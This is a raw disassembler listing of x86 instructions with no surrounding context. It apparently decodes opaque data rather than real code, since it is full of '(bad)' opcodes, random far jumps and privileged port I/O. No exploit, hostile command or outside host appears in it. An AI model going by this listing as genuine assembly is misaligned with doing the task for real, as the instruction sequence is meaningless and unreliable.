  42ec93:	ret    0x4088
  42ec96:	pop    edi
  42ec97:	mov    ah,0x38
  42ec99:	xor    BYTE PTR [eax-0x6cebfbea],ch
  42ec9f:	cmp    DWORD PTR [edx],eax
  42eca1:	stos   BYTE PTR es:[edi],al
  42eca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eca3:	push   ebp
  42eca4:	add    al,0x9f
  42eca6:	xchg   edi,eax
  42eca7:	jmp    0xcf54:0xedeca03d
  42ecae:	or     ebx,DWORD PTR [edi+edx*4-0x1f]
  42ecb2:	jmp    0x42ec61
  42ecb4:	dec    ebx
	...
  42ed15:	add    BYTE PTR [edx],ch
  42ed17:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed1d:	idiv   BYTE PTR [esi+0x19f0a17f]
  42ed23:	mov    eax,ds:0xf5c657bf
  42ed28:	add    DWORD PTR [eax],eax
  42ed2a:	pop    es
  42ed2b:	add    DWORD PTR [eax],eax
  42ed2d:	add    BYTE PTR [esi+0x61],bh
  42ed30:	and    DWORD PTR [edx-0x41],ecx
  42ed33:	and    BYTE PTR [edi-0x76],al
  42ed36:	out    dx,al
  42ed37:	aam    0xf
  42ed39:	jmp    0xa7cc:0xc906c7
  42ed40:	mov    WORD PTR [eax],ss
  42ed42:	inc    edx
  42ed43:	into   
  42ed44:	add    al,0xc6
  42ed46:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42ed48:	addr16 add al,0xbb
  42ed4b:	out    dx,al
  42ed4c:	sub    BYTE PTR [edi-0x20],al
  42ed4f:	fwait
  42ed50:	adc    BYTE PTR [esi],al
  42ed52:	rcr    DWORD PTR [ebx+0x46243d0e],1
  42ed58:	bound  ecx,QWORD PTR [esi]
  42ed5a:	push   ds
  42ed5b:	ins    BYTE PTR es:[edi],dx
  42ed5c:	fist   DWORD PTR [ebx]
  42ed5e:	std    
  42ed5f:	inc    ebp
  42ed60:	cmp    eax,0xa739dd66
  42ed65:	adc    al,0x63
  42ed67:	aam    0x44
  42ed69:	add    BYTE PTR [eax+0x32],0xd2
  42ed6d:	inc    ecx
  42ed6e:	iret   
  42ed6f:	jl     0x42ede8
  42ed71:	mov    bh,0xe8
  42ed73:	ret    
  42ed74:	and    al,0xb2
  42ed76:	aad    0x8d
  42ed78:	retf   
  42ed79:	xchg   edi,eax
  42ed7a:	jne    0x42ed16
  42ed7c:	int    0xfa
  42ed7e:	xchg   ebx,eax
  42ed7f:	fwait
  42ed80:	adc    edx,edi
  42ed82:	pop    esi
  42ed83:	and    esp,DWORD PTR [edx-0x28]
  42ed86:	xor    ah,BYTE PTR [ebx+0xe]
  42ed89:	test   BYTE PTR [eax+0x1f],bh
  42ed8c:	xchg   dl,bl
  42ed8e:	int3   
  42ed8f:	fist   DWORD PTR [edx]
  42ed91:	jno    0x42ed8b
  42ed93:	(bad)  
  42ed94:	pop    ebp
  42ed95:	int3   
  42ed96:	or     eax,esp
  42ed98:	add    DWORD PTR [edx],eax
  42ed9a:	sub    ch,al
  42ed9c:	ret    
  42ed9d:	call   0x46cc:0xad46b76b
  42eda4:	les    esp,FWORD PTR [edx]
  42eda6:	sub    ch,BYTE PTR [esi]
  42eda8:	xor    ecx,esi
  42edaa:	sub    DWORD PTR [eax+ebp*2+0x60],0xffffffeb
  42edaf:	(bad)  
  42edb0:	pop    edx
  42edb1:	repnz pushf 
  42edb3:	dec    ecx
  42edb4:	mov    al,ds:0x318022e3
  42edb9:	mov    cl,0x3d
  42edbb:	repnz daa 
  42edbd:	pop    edi
  42edbe:	rcr    BYTE PTR [ecx+0x6e00f2cd],0x4d
  42edc5:	fwait
  42edc6:	inc    edx
  42edc7:	popa   
  42edc8:	out    dx,eax
  42edc9:	out    dx,al
  42edca:	retf   0xbe31
  42edcd:	xchg   BYTE PTR gs:[ecx+0x1ba94154],bh
  42edd4:	adc    eax,0xeffbec3
  42edd9:	add    BYTE PTR [bp+si+0x4160],dh
  42edde:	pop    es
  42eddf:	and    bl,BYTE PTR [esi-0x57]
  42ede2:	xor    al,0x2b
  42ede4:	shl    esi,0x9a
  42ede7:	cmc    
  42ede8:	push   0xacc67c67
  42eded:	add    DWORD PTR [esp+eiz*4],esp
  42edf0:	mov    dl,0x81
  42edf2:	jp     0x42ed90
  42edf4:	rcr    BYTE PTR [ebp+0x7],1
  42edf7:	imul   ebp,DWORD PTR es:[esp+edi*1+0x4710e2c8],0xcd541a6b
  42ee03:	(bad)  
  42ee04:	lods   eax,DWORD PTR ds:[esi]
  42ee05:	mov    DWORD PTR [ebp+ecx*2+0x1e],ecx
  42ee09:	pop    esi
  42ee0a:	lea    ebx,[ebx+0x0]
  42ee0d:	test   BYTE PTR [eax+0x1e4aa034],bl
  42ee13:	pop    es
  42ee14:	rol    BYTE PTR [edx+0x24],0x67
  42ee18:	popa   
  42ee19:	repnz pop ebp
  42ee1b:	outs   dx,DWORD PTR ds:[esi]
  42ee1c:	mov    edi,DWORD PTR [esi+0x20]
  42ee1f:	fnstenv [esi]
  42ee21:	out    0xaf,eax
  42ee23:	stc    
  42ee24:	lea    edi,[ecx+0x18f69127]
  42ee2a:	cmc    
  42ee2b:	xor    edi,DWORD PTR [ecx+0x3a]
  42ee2e:	jmp    0x8822:0xa0155e90
	...
  42ee95:	add    bl,al
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0xc413f479,edi
  42eea4:	jg     0x42eed7
  42eea6:	int    0xf6
  42eea8:	add    DWORD PTR [eax],eax
  42eeaa:	pop    es
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    al,bl
  42eeaf:	aaa    
  42eeb0:	mov    ebp,0x54d56771
  42eeb5:	push   edi
  42eeb6:	and    bh,dl
  42eeb8:	lods   al,BYTE PTR ds:[esi]
  42eeb9:	mov    eax,ds:0x46375479
  42eebe:	jo     0x2e3ad998
  42eec4:	pushf  
  42eec5:	lea    ecx,[esi]
  42eec7:	cmp    ah,BYTE PTR [edi]
  42eec9:	xor    eax,0x211e81ee
  42eece:	or     eax,ebx
  42eed0:	clc    
  42eed1:	rol    DWORD PTR [eax],0x85
  42eed4:	scas   al,BYTE PTR es:[edi]
  42eed5:	or     BYTE PTR [eax],dh
  42eed7:	jecxz  0x42ee82
  42eed9:	add    al,0x69
  42eedb:	adc    bh,BYTE PTR [eax-0x33]
  42eede:	loop   0x42ee6d
  42eee0:	stc    
  42eee1:	adc    cl,BYTE PTR [edi-0x7f4d452d]
  42eee7:	xor    esp,DWORD PTR [ebx]
  42eee9:	dec    ebp
  42eeea:	scas   al,BYTE PTR es:[edi]
  42eeeb:	adc    al,0xe4
  42eeed:	xor    ebx,0xe
  42eef0:	xchg   ebp,eax
  42eef1:	adc    al,0x35
  42eef3:	xor    BYTE PTR [ecx],bl
  42eef5:	jne    0x42ef1a
  42eef7:	push   esp
  42eef8:	fisub  DWORD PTR [ebx+0x44]
  42eefb:	xor    BYTE PTR ss:[edi],cl
  42eefe:	arpl   WORD PTR [edi],sp
  42ef00:	push   ss
  42ef01:	dec    esp
  42ef02:	and    al,0xc1
  42ef04:	adc    eax,0xa1240989
  42ef09:	adc    ebp,ecx
  42ef0b:	jmp    0x6b39:0x1a95d320
  42ef12:	cli    
  42ef13:	mov    bh,0xe7
  42ef15:	add    ch,BYTE PTR [edi-0x59]
  42ef18:	add    bh,al
  42ef1a:	xor    edx,0x536cd767
  42ef20:	push   0xce98dcd2
  42ef25:	pop    ds
  42ef26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef27:	int    0xc0
  42ef29:	sbb    eax,0xf882e662
  42ef2e:	jmp    DWORD PTR [edx-0x66075970]
  42ef34:	sub    al,0xb
  42ef36:	adc    BYTE PTR [edx+0x55],ch
  42ef39:	mov    ebp,0x74dae5c0
  42ef3e:	push   0xffffff9b
  42ef40:	mov    bh,0xf
  42ef42:	push   0xffffff92
  42ef44:	test   al,0xcf
  42ef46:	in     eax,0x14
  42ef48:	cli    
  42ef49:	std    
  42ef4a:	sub    BYTE PTR [edi+0x48],al
  42ef4d:	or     DWORD PTR [ebp+0x7d02b1a7],eax
  42ef53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef54:	sub    DWORD PTR [eax-0x31c76aa1],esi
  42ef5a:	dec    esp
  42ef5b:	icebp  
  42ef5c:	into   
  42ef5d:	ret    
  42ef5e:	adc    BYTE PTR [edi],al
  42ef60:	hlt    
  42ef61:	neg    DWORD PTR [esi]
  42ef63:	fidivr WORD PTR [eax+edx*1+0x3d]
  42ef67:	add    BYTE PTR [eax],ah
  42ef69:	inc    ecx
  42ef6a:	cmp    DWORD PTR [ecx+ecx*2],eax
  42ef6d:	pop    DWORD PTR [eax-0x61]
  42ef70:	inc    ecx
  42ef71:	mov    bl,0xb
  42ef73:	or     BYTE PTR [ecx+0x62],dl
  42ef76:	sbb    DWORD PTR [edx],0xe63f5124
  42ef7c:	or     al,0x75
  42ef7e:	shl    bl,cl
  42ef80:	xor    BYTE PTR [ebp-0x4c],ah
  42ef83:	das    
  42ef84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef85:	repnz or al,0xdb
  42ef88:	xor    BYTE PTR [edx],bh
  42ef8a:	sbb    cl,BYTE PTR [eax]
  42ef8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef8d:	add    BYTE PTR [ebp+eiz*1+0x3d833247],bh
  42ef94:	jmp    0xcfe7:0x6f7c2309
  42ef9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef9c:	inc    eax
  42ef9d:	sti    
  42ef9e:	in     al,0x43
  42efa0:	fwait
  42efa1:	push   ebp
  42efa2:	jae    0x42ef3a
  42efa4:	sub    al,0x6c
  42efa6:	scas   al,BYTE PTR es:[edi]
  42efa7:	mov    dh,0x89
  42efa9:	icebp  
  42efaa:	mov    bh,0xd7
  42efac:	sub    eax,0x62b27077
  42efb1:	nop
  42efb2:	inc    edi
  42efb3:	pop    ecx
  42efb4:	mov    ds:0x0,al
	...
  42f015:	add    BYTE PTR [edx],dl
  42f017:	ds int 0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0x904bd516
  42f024:	jmp    0x700:0x1f7d447
  42f02b:	add    DWORD PTR [eax],eax
  42f02d:	add    BYTE PTR ds:0x45771246,bl
  42f033:	mov    bh,0x54
  42f035:	mov    ebp,0x1f8ef140
  42f03a:	ins    BYTE PTR es:[edi],dx
  42f03b:	sbb    edi,DWORD PTR [eax-0x3e05fd8d]
  42f041:	push   cs
  42f042:	jae    0x42f024
  42f044:	lahf   
  42f045:	inc    edx
  42f046:	cmp    al,0x69
  42f048:	inc    eax
  42f049:	jl     0x42f02a
  42f04b:	jl     0x42f054
  42f04d:	leave  
  42f04e:	test   DWORD PTR es:[esi-0x3864237d],esp
  42f055:	add    eax,0x998555bf
  42f05a:	cmp    DWORD PTR [edx],esi
  42f05c:	add    eax,0x74350708
  42f061:	hlt    
  42f062:	fnsave [edi-0x2e]
  42f065:	dec    ebx
  42f066:	add    edx,DWORD PTR [ebx-0x4042fe91]
  42f06c:	add    al,0x33
  42f06e:	imul   esi,DWORD PTR ds:0x32756537,0x32
  42f075:	pop    esi
  42f076:	idiv   BYTE PTR [ebx+0x7ae69051]
  42f07c:	and    eax,0x574fccf3
  42f081:	jmp    0x42f058
  42f083:	es push eax
  42f085:	pusha  
  42f086:	shl    BYTE PTR [ecx-0x521937c0],0xb6
  42f08d:	leave  
  42f08e:	inc    ebp
  42f08f:	out    dx,al
  42f090:	aam    0x6
  42f092:	xchg   edi,eax
  42f093:	sub    al,0x30
  42f095:	cmp    eax,0x45a2209c
  42f09a:	stos   BYTE PTR es:[edi],al
  42f09b:	mov    eax,0x24cc8b99
  42f0a0:	adc    edi,ebx
  42f0a2:	pop    esi
  42f0a3:	shl    ah,1
  42f0a5:	and    bh,BYTE PTR [esi]
  42f0a7:	push   edi
  42f0a8:	mov    DWORD PTR [ebx+0x6f],ecx
  42f0ab:	(bad)  
  42f0ac:	cmp    eax,0x325be864
  42f0b1:	cmp    cl,dh
  42f0b3:	cwde   
  42f0b4:	rcr    bh,1
  42f0b6:	dec    esi
  42f0b7:	(bad)  
  42f0b8:	jle    0x42f041
  42f0ba:	fnstcw WORD PTR [esi+0x6f]
  42f0bd:	push   ss
  42f0be:	mov    ds:0x580466a2,eax
  42f0c3:	sub    eax,0x421bcc4f
  42f0c8:	dec    ebp
  42f0c9:	in     eax,0xb9
  42f0cb:	cli    
  42f0cc:	or     eax,0xea83e6b8
  42f0d1:	pop    ebp
  42f0d2:	sub    ah,BYTE PTR [ecx]
  42f0d4:	iret   
  42f0d5:	outs   dx,DWORD PTR ds:[esi]
  42f0d6:	inc    esi
  42f0d7:	vandps ymm0,ymm5,YMMWORD PTR [edx+0x6ebb93cd]
  42f0df:	aas    
  42f0e0:	data16 xor al,0x51
  42f0e3:	mov    ah,BYTE PTR [ecx+esi*8-0x1fe87262]
  42f0ea:	jae    0x42f0e2
  42f0ec:	jae    0x42f0d6
  42f0ee:	imul   ecx,DWORD PTR [edx],0x43
  42f0f1:	(bad)  
  42f0f2:	mov    dh,0x6e
  42f0f4:	pop    ebx
  42f0f5:	xor    ah,ah
  42f0f7:	mov    edi,0xf5e319f7
  42f0fc:	sar    bh,1
  42f0fe:	lods   al,BYTE PTR ds:[si]
  42f100:	xchg   edx,eax
  42f101:	pop    edi
  42f102:	push   edi
  42f103:	lds    edx,FWORD PTR [esi]
  42f105:	sbb    esp,DWORD PTR [ecx-0x4cb2281b]
  42f10b:	jle    0x42f163
  42f10d:	daa    
  42f10e:	dec    ecx
  42f10f:	jne    0x42f18c
  42f111:	test   eax,0xf5ce3c57
  42f116:	mov    ebx,0xcf987558
  42f11b:	mov    al,ds:0xa7974001
  42f120:	sbb    DWORD PTR [edx-0xf253004],esp
  42f126:	pop    edx
  42f127:	mov    bh,cl
  42f129:	xlat   BYTE PTR ds:[ebx]
  42f12a:	popa   
  42f12b:	push   ecx
  42f12c:	jne    0x42f17c
  42f12e:	jmp    0xe193:0x8d0a0a6a
	...
  42f195:	add    BYTE PTR [edx+0x26],bl
  42f198:	jecxz  0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f17a
  42f1a3:	mov    eax,0xf8db463c
  42f1a8:	add    DWORD PTR [eax],eax
  42f1aa:	pop    es
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    BYTE PTR [edi],ah
  42f1af:	scas   al,BYTE PTR es:[edi]
  42f1b0:	add    eax,0xe2ed7c56
  42f1b5:	adc    cl,0xb7
  42f1b8:	adc    BYTE PTR [edx+0x7870f3b],bl
  42f1be:	leave  
  42f1bf:	sub    ebx,ebx
  42f1c1:	sub    al,0x79
  42f1c3:	pusha  
  42f1c4:	mov    ebx,0xbbd4c50b
  42f1c9:	outs   dx,DWORD PTR cs:[esi]
  42f1cb:	and    eax,ebp
  42f1cd:	out    dx,al
  42f1ce:	outs   dx,DWORD PTR ds:[esi]
  42f1cf:	inc    esp
  42f1d0:	call   0x4b646b08
  42f1d5:	int    0xde
  42f1d7:	aas    
  42f1d8:	push   cs
  42f1d9:	lds    eax,FWORD PTR [edx+esi*1+0x3d]
  42f1dd:	out    0xa6,eax
  42f1df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f1e0:	push   cs
  42f1e1:	jne    0x42f205
  42f1e3:	mov    bh,0x29
  42f1e5:	and    ah,BYTE PTR [esi-0x42]
  42f1e8:	pop    ss
  42f1e9:	fwait
  42f1ea:	jp     0x42f1fa
  42f1ec:	nop
  42f1ed:	in     eax,0x87
  42f1ef:	push   eax
  42f1f0:	inc    esp
  42f1f1:	int    0xe6
  42f1f3:	xor    ecx,DWORD PTR [esi]
  42f1f5:	daa    
  42f1f6:	ja     0x42f1b3
  42f1f8:	popf   
  42f1f9:	iret   
  42f1fa:	fstp   QWORD PTR [esi]
  42f1fc:	fisubr WORD PTR [edx-0x3b]
  42f1ff:	jg     0x42f256
  42f201:	pop    ds
  42f202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f203:	cmp    eax,0x44f1ba8c
  42f208:	stos   DWORD PTR es:[edi],eax
  42f209:	sar    DWORD PTR [ecx+0x443716fb],0x5d
  42f210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f211:	mov    edx,0x5d9faa05
  42f216:	inc    ebx
  42f217:	pop    es
  42f218:	ret    
  42f219:	ror    DWORD PTR [edx],1
  42f21b:	in     al,0x1b
  42f21d:	sub    eax,0x71c9f393
  42f222:	dec    ebx
  42f223:	dec    ebp
  42f224:	add    eax,DWORD PTR [edi+0x57]
  42f227:	mov    ah,0xc9
  42f229:	retf   0x380b
  42f22c:	mov    eax,0xa2f0dfa6
  42f231:	pop    es
  42f232:	icebp  
  42f233:	std    
  42f234:	sti    
  42f235:	mov    esi,gs
  42f237:	and    al,0xb4
  42f239:	push   edi
  42f23a:	(bad)  
  42f23b:	pusha  
  42f23c:	pop    ecx
  42f23d:	scas   eax,DWORD PTR es:[edi]
  42f23e:	push   ebx
  42f23f:	(bad)  
  42f240:	mov    bh,0x29
  42f242:	clc    
  42f243:	rcl    DWORD PTR [ecx-0x3d],0xfc
  42f247:	jo     0x42f22a
  42f249:	cmp    eax,DWORD PTR [eax+edi*8]
  42f24c:	push   cs
  42f24d:	fs test al,0x74
  42f250:	xchg   esi,eax
  42f251:	adc    al,0xe
  42f253:	imul   ebp,DWORD PTR [ebp-0x47],0x79
  42f257:	mov    bl,0x30
  42f259:	repnz mov es:0x613aacc5,al
  42f260:	or     ebx,DWORD PTR [eax+eax*8+0x34]
  42f264:	jle    0x42f2d8
  42f266:	(bad)  
  42f267:	sbb    dl,BYTE PTR [eax-0x5fa35050]
  42f26d:	nop
  42f26e:	mov    bh,0xcf
  42f270:	xrelease xchg BYTE PTR [edi],dl
  42f273:	pop    ebx
  42f274:	jmp    0x42f27a
  42f276:	mov    BYTE PTR [edx+0x6d],cl
  42f279:	call   0xc35e:0x3f86a47e
  42f280:	push   ds
  42f281:	mov    BYTE PTR [edx+eax*1],al
  42f284:	hlt    
  42f285:	inc    ebp
  42f286:	push   esp
  42f287:	or     BYTE PTR ds:0xaf134637,0x25
  42f28e:	scas   al,BYTE PTR es:[edi]
  42f28f:	leave  
  42f290:	jl     0x42f2be
  42f292:	les    ecx,FWORD PTR ds:0x8780ec8e
  42f298:	addr16 aaa 
  42f29a:	pop    edi
  42f29b:	sar    DWORD PTR [edi+esi*2+0x52],0x48
  42f2a0:	fadd   st(0),st
  42f2a2:	ror    BYTE PTR [esi-0x68845a24],cl
  42f2a8:	jno    0x42f26a
  42f2aa:	ret    0x8369
  42f2ad:	mov    eax,ds:0xa5b5ebbd
  42f2b2:	mov    WORD PTR [ecx-0x62],cs
	...
  42f315:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	xor    al,0x40
  42f324:	sub    esp,esp
  42f326:	loop   0x42f321
  42f328:	add    DWORD PTR [eax],eax
  42f32a:	pop    es
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    bh,al
  42f32f:	adc    al,0xf4
  42f331:	dec    edx
  42f332:	jae    0x42f2e0
  42f334:	dec    eax
  42f335:	sbb    ecx,DWORD PTR [esi+ebx*8-0x6b]
  42f339:	scas   eax,DWORD PTR es:[edi]
  42f33a:	sub    DWORD PTR [ecx-0x3b],ebp
  42f33d:	add    DWORD PTR [edx+0x18],edx
  42f340:	inc    edx
  42f341:	gs pop edx
  42f343:	and    dh,BYTE PTR [edi-0x38]
  42f346:	outs   dx,BYTE PTR ds:[esi]
  42f347:	cwde   
  42f348:	xchg   edi,eax
  42f349:	mov    dh,0x13
  42f34b:	es push esp
  42f34d:	add    DWORD PTR [ecx-0x2ace391b],ecx
  42f353:	jno    0x42f38b
  42f355:	rcl    BYTE PTR [esi],0x23
  42f358:	xchg   edx,eax
  42f359:	jg     0x42f351
  42f35b:	call   0x6857:0xd42efd49
  42f362:	mov    ebp,db3
  42f365:	and    eax,0xbfedc83b
  42f36a:	dec    esp
  42f36b:	idiv   bh
  42f36d:	(bad)  
  42f36e:	jns    0x42f31e
  42f370:	call   0xfa91:0xd077
  42f376:	lahf   
  42f377:	xlat   BYTE PTR ds:[ebx]
  42f378:	test   BYTE PTR [eax-0x9],al
  42f37b:	add    esp,DWORD PTR [ebx-0x1547d33b]
  42f381:	cmp    dh,BYTE PTR [ebp+ebx*8-0x8]
  42f385:	and    DWORD PTR [esi],esi
  42f387:	ret    0x6fa0
  42f38a:	in     eax,0xfd
  42f38c:	(bad)  
  42f38d:	xor    cl,ah
  42f38f:	push   ebx
  42f390:	daa    
  42f391:	stc    
  42f392:	xchg   ebp,edi
  42f394:	pop    edx
  42f395:	aam    0xb9
  42f397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f398:	sbb    eax,0xa4b385f5
  42f39d:	xchg   ecx,eax
  42f39e:	aaa    
  42f39f:	pop    edx
  42f3a0:	lds    edi,FWORD PTR [edx]
  42f3a2:	dec    ebp
  42f3a3:	push   0x60
  42f3a5:	sub    esp,0x1bbfdc42
  42f3ab:	mov    edi,0x109ac42a
  42f3b0:	sbb    BYTE PTR [ebx+ebp*4],0xf7
  42f3b4:	pop    edi
  42f3b5:	or     BYTE PTR [ebx-0x34],dh
  42f3b8:	mov    esi,0x23a30008
  42f3bd:	sbb    eax,0xa3e1e0c0
  42f3c2:	xchg   edx,eax
  42f3c3:	sub    ah,BYTE PTR [edi+esi*1+0x431fdbe8]
  42f3ca:	inc    eax
  42f3cb:	pop    ecx
  42f3cc:	xchg   esp,eax
  42f3cd:	repz mov bl,0xa5
  42f3d0:	fisubr DWORD PTR [eax]
  42f3d2:	stc    
  42f3d3:	enter  0x125b,0x88
  42f3d7:	xchg   ebx,eax
  42f3d8:	les    esp,FWORD PTR [ebp+0x44]
  42f3db:	mov    dh,al
  42f3dd:	test   BYTE PTR [ebx+0x22],cl
  42f3e0:	dec    ebp
  42f3e1:	mov    cl,0x8e
  42f3e3:	iret   
  42f3e4:	fisub  WORD PTR [ecx]
  42f3e6:	icebp  
  42f3e7:	(bad)  
  42f3e9:	rcr    DWORD PTR [esi-0x7f],cl
  42f3ec:	(bad)  
  42f3ed:	shr    edi,1
  42f3ef:	jmp    0x42f373
  42f3f1:	pop    ss
  42f3f2:	xchg   ecx,eax
  42f3f3:	pop    ds
  42f3f4:	fmul   DWORD PTR [ecx+ecx*4-0x27]
  42f3f8:	sub    ebp,0x16b30a64
  42f3fe:	cmp    cl,BYTE PTR [ecx+0x61]
  42f401:	dec    ebp
  42f402:	mov    DWORD PTR [ebx],ecx
  42f404:	loope  0x42f47c
  42f406:	xor    BYTE PTR [eax+0x73],dl
  42f409:	icebp  
  42f40a:	popf   
  42f40b:	cmp    DWORD PTR [edi-0x5d],ecx
  42f40e:	and    DWORD PTR [ebx+0x1c],0x61
  42f412:	xor    DWORD PTR [ebx],0xff471652
  42f418:	les    edx,FWORD PTR [ecx+0x74a44b31]
  42f41e:	scas   eax,DWORD PTR es:[edi]
  42f41f:	(bad)  
  42f422:	mov    al,0x43
  42f424:	rcr    DWORD PTR [ecx-0x7da0615f],1
  42f42a:	pop    ecx
  42f42b:	nop
  42f42c:	pusha  
  42f42d:	arpl   ax,cx
  42f42f:	mov    ebx,DWORD PTR ds:0xb3626442
	...
  42f495:	add    BYTE PTR [edi],dh
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	jns    0x42f48c
  42f4a4:	rol    BYTE PTR [edi-0x17],cl
  42f4a7:	cli    
  42f4a8:	add    DWORD PTR [eax],eax
  42f4aa:	pop    es
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    BYTE PTR [esi+esi*2-0x53bcd322],dh
  42f4b4:	fwait
  42f4b5:	das    
  42f4b6:	mov    esi,0xc383ac23
  42f4bb:	inc    edx
  42f4bc:	xor    edx,DWORD PTR [ebx+0x45cd4e94]
  42f4c2:	add    al,0x7d
  42f4c4:	pop    ebp
  42f4c5:	ss jmp 0x42f4da
  42f4c8:	into   
  42f4c9:	cld    
  42f4ca:	jl     0x42f523
  42f4cc:	(bad)  
  42f4ce:	js     0x42f474
  42f4d0:	jl     0x42f526
  42f4d2:	adc    BYTE PTR [ecx-0x4],ah
  42f4d5:	mov    ah,0xc5
  42f4d7:	stc    
  42f4d8:	mov    gs,WORD PTR [edi]
  42f4da:	ror    DWORD PTR [ecx+ecx*2-0x70c8e967],cl
  42f4e1:	sub    al,0xf0
  42f4e3:	aaa    
  42f4e4:	add    al,0x9a
  42f4e6:	mov    DWORD PTR [edx+edx*4+0x28ba1417],ecx
  42f4ed:	push   0xe87f33b1
  42f4f2:	mov    ebp,0xe071aa96
  42f4f7:	mov    cl,ah
  42f4f9:	jmp    0x56d2:0xfe114b56
  42f500:	push   ss
  42f501:	repnz sbb dl,dh
  42f504:	push   ecx
  42f505:	push   eax
  42f506:	ins    DWORD PTR es:[edi],dx
  42f507:	fisubr DWORD PTR [eax+ebp*1-0x36]
  42f50b:	fdiv   DWORD PTR [ecx+0x6adbcee7]
  42f511:	jmp    0x42f508
  42f513:	xchg   edx,eax
  42f514:	ins    DWORD PTR es:[edi],dx
  42f515:	sbb    bh,ch
  42f517:	mov    edi,0xb837339e
  42f51c:	inc    ebx
  42f51d:	fs mov cl,0xb4
  42f520:	inc    esi
  42f521:	pause  
  42f523:	mov    bl,0x24
  42f525:	inc    ebp
  42f526:	sar    esi,0x8d
  42f529:	fidiv  DWORD PTR [ecx]
  42f52b:	pop    ecx
  42f52c:	mov    ebp,0x6252ca1b
  42f531:	push   esi
  42f532:	or     eax,0x547554ef
  42f537:	jmp    0x46bb:0x9a931749
  42f53e:	loopne 0x42f51b
  42f540:	sbb    eax,0xc209b0c3
  42f545:	push   ds
  42f546:	cdq    
  42f547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f548:	enter  0xcb8d,0x4b
  42f54c:	hlt    
  42f54d:	add    al,0x47
  42f54f:	stos   BYTE PTR es:[edi],al
  42f550:	out    0xf8,al
  42f552:	je     0x42f54d
  42f554:	fdiv   DWORD PTR [edi+0x4340d90e]
  42f55a:	or     bl,dl
  42f55c:	pop    esi
  42f55d:	xor    esp,esi
  42f55f:	jecxz  0x42f5c9
  42f561:	add    bl,0x8d
  42f564:	(bad)  
  42f565:	xchg   edi,eax
  42f566:	xchg   ecx,eax
  42f567:	cmp    ebx,esp
  42f569:	outs   dx,BYTE PTR ds:[esi]
  42f56a:	jmp    0xcd807f04
  42f56f:	adc    DWORD PTR [eax-0x2f],ecx
  42f572:	inc    ebx
  42f573:	push   cs
  42f574:	push   ebp
  42f575:	pop    ss
  42f576:	push   ebx
  42f577:	cmovae eax,DWORD PTR [ebx+0x746889e3]
  42f57e:	pop    es
  42f57f:	push   cs
  42f580:	jmp    FWORD PTR [esi+esi*4-0x779a47ce]
  42f587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f588:	lds    esi,FWORD PTR [eax-0x66]
  42f58b:	jp     0x42f53e
  42f58d:	ins    DWORD PTR es:[edi],dx
  42f58e:	push   esp
  42f58f:	(bad)  
  42f591:	ins    DWORD PTR es:[edi],dx
  42f592:	fincstp 
  42f594:	xor    ebp,edi
  42f596:	js     0x42f5cf
  42f598:	test   BYTE PTR [edi-0x36315d49],ch
  42f59e:	jb     0x42f545
  42f5a0:	test   al,0x19
  42f5a2:	add    cl,BYTE PTR [esi]
  42f5a4:	mov    esp,0x2de989f
  42f5a9:	xchg   ebp,eax
  42f5aa:	out    dx,eax
  42f5ab:	and    al,0xac
  42f5ad:	and    al,0x2c
  42f5af:	(bad)  
  42f5b0:	out    dx,eax
  42f5b1:	pop    esi
  42f5b2:	cli    
  42f5b3:	arpl   WORD PTR fs:[eax],ax
	...
  42f616:	ds push esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2+0x24]
  42f623:	push   ds
  42f624:	pop    ecx
  42f625:	fdivr  st(0),st
  42f627:	sti    
  42f628:	add    DWORD PTR [eax],eax
  42f62a:	pop    es
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [eax+0x219cbdd6],ah
  42f633:	imul   BYTE PTR [edi+ebx*8]
  42f636:	xlat   BYTE PTR ds:[ebx]
  42f637:	es lahf 
  42f639:	addr16 daa 
  42f63b:	push   esi
  42f63c:	pop    ebp
  42f63d:	push   ebp
  42f63e:	cdq    
  42f63f:	push   ebp
  42f640:	jne    0x42f6a7
  42f642:	adc    al,ch
  42f644:	mov    dh,0x44
  42f646:	cmp    DWORD PTR [eax+0x2d2a1f60],0x4bff3161
  42f650:	pop    es
  42f651:	xor    edi,DWORD PTR [ebx-0x6b3f5719]
  42f657:	sahf   
  42f658:	out    0x1d,al
  42f65a:	vmulps xmm6,xmm1,XMMWORD PTR ds:[ebp+edx*1-0x25]
  42f661:	dec    bx
  42f663:	xchg   esp,eax
  42f664:	jmp    0x5248:0xa2d4b717
  42f66b:	adc    ah,BYTE PTR [ecx-0x6f]
  42f66e:	test   eax,0x90a62251
  42f673:	and    al,0xd7
  42f675:	dec    eax
